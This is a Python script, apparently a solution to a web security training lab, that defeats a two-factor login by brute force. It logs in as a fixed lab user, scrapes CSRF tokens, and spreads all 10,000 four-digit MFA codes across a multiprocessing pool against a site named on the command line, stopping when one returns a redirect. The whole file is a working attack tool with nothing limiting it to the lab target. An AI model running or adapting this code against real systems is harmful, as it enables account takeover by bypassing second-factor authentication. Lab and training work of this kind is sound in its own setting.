import sys, requests, multiprocessing
from bs4 import BeautifulSoup

site = sys.argv[1]

if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

login_url = f'https://{site}/login'
login2_url = f'https://{site}/login2'



#Does the bascic login functionality that was given in Code labs
def login_user(s):
    #Takes in the argument of a session request 

    #Performs a scrape for the CSRF 
    try:
        resp = s.get(login_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        csrf = soup.find('input', {'name':'csrf'}).get('value')
    except:
        print('Unable to login')
        
    logindata = {
    'csrf' : csrf,
    'username' : 'carlos',
    'password' : 'montoya'
    }
    
    #Performs basic login for the user
    # print(f'Logging in as carlos:montoya')
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')
    # print(f'Login response: {resp.text}')

    return csrf

#The function used to brute force/check request for the auth code
#Takes in the authentication code to test as well as the event handler which is in charge of ending the program
def multi_attack_auth(attack_vector, event):

    #If event is not set, then keep running
    if not event.is_set():

        #create new session to collect new csrf
        s = requests.Session()

        csrf = login_user(s)
        login2data = {
            'csrf' : csrf,
            'mfa-code' : attack_vector
        }

        #Test new authetication code to see if it returns a 302(valid) response.
        try:
            resp = s.post(login2_url, data=login2data, allow_redirects=False)
            if resp.status_code == 302:
                print(f' ===== {attack_vector } || {resp.status_code} =====')
                event.set()
                
            if resp.status_code == 200:
                print(f'{attack_vector} || {resp.status_code}')
        except:
            print('Not able to properly test auth codes')
            

def main():
    #Counts the CPU's present on the system
    cpu_count = multiprocessing.cpu_count()

    #Creates a Pool that creates processes equal to the amount of cpu cores 
    pool = multiprocessing.Pool(cpu_count)

    #The procManager is in charge of controlling if the program should continue running
    #Read the following article to get this to work:
    #https://code.luasoftware.com/tutorials/python/python-multiprocess-continue-running-until-stop-signal/
    procManager = multiprocessing.Manager()
    event = procManager.Event()

    #Generates the atttack vectors to check
    attack_vector = []
    for i in range(0, 10000):
        attack_vector.append('%04d' % i)

    #Maps the vectors equally across the Pool
    for i in range(10000):
        pool.apply_async(multi_attack_auth, (attack_vector[i], event))
    pool.close()

    event.wait()
    pool.terminate()

#Runs the program
if __name__ == '__main__':
    # multi_attack_auth()
    main()


    